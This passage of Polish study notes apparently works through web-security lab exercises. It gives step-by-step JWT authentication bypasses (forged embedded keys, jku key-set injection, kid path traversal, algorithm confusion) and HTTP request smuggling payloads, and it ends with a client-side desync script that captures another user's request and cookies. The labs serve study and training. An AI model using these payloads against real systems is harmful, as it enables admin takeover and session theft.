Zasadniczo powinna istnieć white-lista kluczy, których może używać serwer, jednak może się zdarzyć, że takowa nie istnieje i wtedy serwer użyje dowolnego podanego klucz w tym nagłówku i taki właśnie przypadek występuje w tym zadaniu.
1. Aby wykorzystać taką podatność zaczynamy od wygenerowania własnego klucza w JWT Editor Keys -> Generate RSA Key -> Generate
2. Przechodzimy do Burp Reapeatera z zapyatniem na `/admin`
3. W cookei modyfikujemy nazwę użytkownika na admin i klikamy Attack -> Embedded JWK i dodajemy wcześniej stworzony klucz.
4. Taki token kopiujemy i wklejamy do cookie, aby już jako administrator zalogować się do panelu administracyjnego.

## Lab: JWT authentication bypass via jku header injection
Pole `jku` w JWT zawiera link do strony z kluczami, które należy użyć do weryfikacji podpisu. Jeśli nie jest ona odpowiednio weryfikowana można to wykorzystać do podania własnego klucza. Klucze są zapisane w takiej formie:
```
{
    "keys": [
	{
	...
	},
	{
	...
	},
	...
    ]
}
```
1. Tworzymy parę kluczy RSA
2. Pobieramy klucz publiczny w formie JWT i kopiujemy go na exploit serwer w takiej formie:
```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "f761727b-5805-4415-a2af-cf5ba0200ce1",
            "n": "yvjUSqZOS1FbHYEMh-0rTaIMRBqgyqDNmaqY7C5-aE3n_fnP-7w2eAAf75jKYfNKAMbTTclFtJo_OTdN9n2UMUlWLD59arujMdt3Gfuv220cyLC__mab84SYHf13Xcg8MGLrgMJDu-oCYMsJKza82hnyVNsH59C5507KYsma_qhCEjGKmEi-9e-lA6YzACGRO1_pmp7bQlX6QQ76OS7EnzLSmVTrMQSI04vv35rJN418gr4NVxoEzKBvlkToO2vbDCILgil4NEAZ8O_6nYsaR7qAVuJibq1CoeShjBWB8OGMlZpgKNzzPjUnFeMaFAOqpBMXgKdkIxxi37oBJPY5kQ"
        }
    ]
}
```
3. Dodajemy w nagłówku payloadu link do strony w polu `jku` (należy je stworzyć)
```
{
    "alg": "RS256",
    "jku": "https://exploit-0ab400e40452efd5c0cf7ab4012d00c5.web-security-academy.net/exploit"
}
```
4. Username podnieniamy na administrator, a gotowy payload podpisujemy wygenerowanym wcześniej kluczem
5. Używamy payloadu do zalogowania

## Lab: JWT authentication bypass via kid header path traversal
W polu `kid` w JWT podawane jest id klucza, może być to także ścieżka do niego, co, źle zabezpieczone umożliwia path traversal.
1. Tworzymy klucz symetryczny o wartości zakodowanego w base64 znaku null (`AA==`)
2. Tworzymy zapytanie na `/admin` i przesyłamy do reapeatera.
3. W JWT zmieniamy nazwę użytkownika na administrator, a w polu `kid` dajemy ścieżkę do `/dev/null`, ponieważ wiadomo, że ten plik jest pusty, a zatem zapytanie do niego zwróci wartość null 
```
{
    "kid": "../../../../../../../../../../../../dev/null",
    "alg": "HS256"
}
```
Dajemy dużo `../` ponieważ chemy się cofnąć do najniższego katalogu, a zbyt duża liczba cofnięć po prostu zostanie pominięta.
4. Podpisujemy JWT wcześniej wygenerowanym kluczem i z użyciem paylodu logujemy się na konto administracyjne.

## Lab: JWT authentication bypass via algorithm confusion
Czasami pomimo tego, że serwer używa do weryfikacji tylko kryptografii asymetrycznej w kodzie znajduje się taki sam rodzaj weryfikacji, tylko z kluczem symetrycznym (zostaje to zostawione z gotowej implementacji).
```
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```
Z racji, że zakładane jest, że użyta zostanie jedynie kryptografia asymetryczna, klucz publiczny jest zakodowany w pliku.
```
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```
Wtedy może pojawić się sytuacja, w której podamy JWT podpisane kluczem publicznym (tym z serwera), bo często znajduje się on jako publiczna dana np. w `/jwks.json` lub `/.well-known/jwks.json` oraz dopisujemy, że algorytmem ma być HS256, a wtedy serwer zweryfikuje wiadomość dokładnie tym samym kluczem, a zatem weryfikacja zakończy się sukcesem, bo używana będzie kryptografia symetryczna, a klucze będą te same.
1. Aby dostać się na panel administracyjny `/admin` musimy być na koncie administratora
2. Znajdujemy klucz publiczny strony w katalogu `/jwks.json` i kopiujemy ten obiekt.
3. W `JWT Editor Keys` dodajemy nowy klucz RSA i wklejamy tam znaleziony klucz publiczny ze strony
4. Kopiujemy klucz publiczny w formacie PEM
5. W decoderze zamieniamy go na base64
6. W `JWT Editor Keys` tworzymy klucz symetryczny, klikamy generate i w pole `k` wpisujemy klucz publiczny w base64
7. Przechodzimy do `Burp Reapeatera` i z zakładce JWT, jako użytkownika dajemy administrator, a jako alg `HS256`
8. Podpisujemy wcześniej wygenerowanym kluczem symetrycznym
9. Logujemy się na konto administratora przy pomocy gotowego JWT

## Lab: JWT authentication bypass via algorithm confusion with no exposed key
Zadanie bliźnieacze do poprzedniego, ale klucz nie jest publiczny.
1. Logujemy się na konto, zdobywamy pierwsze JWT i je zapisujemy.
2. Wylogowujemy się i logujemy się ponownie zdobywając drugie JWT.
3. Za pomocą programu sig2n dodając jako atgumenty dwa znalezione JWT dostajemy potencjalne klucze wraz z podpisanymi payloadami.

Komenda:
```
docker run --rm -it portswigger/sig2n <token1> <token2>
```
Wynik:
```
Found n with multiplier 1:

    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzN1dmSGpsaWxJQUo4U3h2Z2FDOQpDK0VhSDF0RG1PYVV3V2hWSDJibUV1eE1RVFpFSEZPSWl1S2pYbU1TeFU0UzR6T0JDQVM0VnRuTGFrYnlBVVNaCk40Wmg0d2RNa1BTdDlkNDEzdnpwSFVtR2p2TTNRdGZ6d3lEb3dVQlVWa0pGWFFKN1FmZmE5NTNMZjdNYndTbkYKYklUOFN2UDdLcVF3c1hzZ1VHWnRqdnFIMkFGVXZtRlJ4TjIzRjdrRU9LdXdjYW1Bbk9LZFN5aGRSai9iSFhmWgpUY0k2VERZcjE3M1dxWlVxT2RQYlpCczNMdFdleGNiSmc1N0xHQyt0SWttRXFzZ2g5U0NhMEFOc2RtcXJQTTNnCjA3OThXMmpydWNJTnV1UGZod0pvampKTlhYTjZpeXh4RFZhV0kwT0RURGpnaTl2OVR5WmFWSUo5UmxEbmFnQzUKbVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiJjMjk5ZDI5My1hY2M4LTQ3MmEtOTJmNy1hNTczN2NiOTE3YjciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU5MDg2ODAzfQ.a8ktS-l3ELClexT94CIbrgjeop8nWC066vLxQX-fxy8

    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQTM3V2ZIamxpbElBSjhTeHZnYUM5QytFYUgxdERtT2FVd1doVkgyYm1FdXhNUVRaRUhGT0kKaXVLalhtTVN4VTRTNHpPQkNBUzRWdG5MYWtieUFVU1pONFpoNHdkTWtQU3Q5ZDQxM3Z6cEhVbUdqdk0zUXRmegp3eURvd1VCVVZrSkZYUUo3UWZmYTk1M0xmN01id1NuRmJJVDhTdlA3S3FRd3NYc2dVR1p0anZxSDJBRlV2bUZSCnhOMjNGN2tFT0t1d2NhbUFuT0tkU3loZFJqL2JIWGZaVGNJNlREWXIxNzNXcVpVcU9kUGJaQnMzTHRXZXhjYkoKZzU3TEdDK3RJa21FcXNnaDlTQ2EwQU5zZG1xclBNM2cwNzk4VzJqcnVjSU51dVBmaHdKb2pqSk5YWE42aXl4eApEVmFXSTBPRFREamdpOXY5VHlaYVZJSjlSbERuYWdDNW1RSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiJjMjk5ZDI5My1hY2M4LTQ3MmEtOTJmNy1hNTczN2NiOTE3YjciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU5MDg2ODAzfQ.DJ5Il_4jNK3qQzASdrL00XklXNfYKkdpUIB7wPl4o9k

```
4. Sprawdzamy payloady, jeden z nich zosatnie przyjęty przez serwer.
5. Kobiujemy zatem zdobyty klucz i robimy to samo co od punku 6 w poprzednim zadaniu.

# HTTP request smuggling
## TE:CL
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
### Potwierdzenie istnienia TE:CL
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```
## CL:TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Potwierdzenie istnienia CL:TE
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```
```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x[GET /home HTTP/1.1
Host: vulnerable-website.com] -> część następnego requestu wchodzi jako pole w nagłówku
```
## TE:TE obfuscation
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## CL.0
Front-end server reads request normally, but back-end server doesn't expect a request with body, so it doesn't read the `Content-Length` header and skips the body of the request.
1. Create one tab containing the setup request and another containing an arbitrary follow-up request.
2. Add the two tabs to a group in the correct order.
3. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
4. Change the Connection header to keep-alive.
5. Send the sequence and check the responses.

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```
## Lab: Client-side desync

Exploit
```
<script>
fetch('https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net/', {
    method: 'POST',
    body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a0200b503e504efc03d0b4500d90040.web-security-academy.net\r\nCookie: session=WzrBdf1REs5CpAFhe6XdH3Vaytpm9Jqu; _lab_analytics=KDlWxoyNEa9QKHxEapAZvcFMh7q4JXHScKCTIRDbPo9potAnTw6arF4kxH8rCNKI4ZZOVvnI8uMaNuLpBepHu87dy2pccs1TUgF3bgOJ8cAt0rlRDzGw8t6JyGKVgJqAVbtPGjI5UHuBVMu2MqeUrIPP95J5nMVcpkqNBv9rGxWcNPW7E4keKM1xBuX69uSYGLtktyIR48WF7RdKqStKPJLaKwygIWJqIToeauEy1oS3hMYnapRUBCQUt2NnKXhO\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 800\r\nOrigin: https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net\r\nReferer: https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net/en/post?postId=2\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nTe: trailers\r\nConnection: close\r\n\r\ncsrf=ORXQq2bMc9EWQggwe2fzPTAf5OGdOHfO&postId=2&name=a&email=asdas%40gf&website=http%3A%2F%2Fa.com&comment=', // malicious prefix
    mode: 'no-cors', // ensures the connection ID is visible on the Network tab
    credentials: 'include' // poisons the "with-cookies" connection pool
}).then(() => {
    location = 'https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net/en' // uses the poisoned connection
})
</script>
```
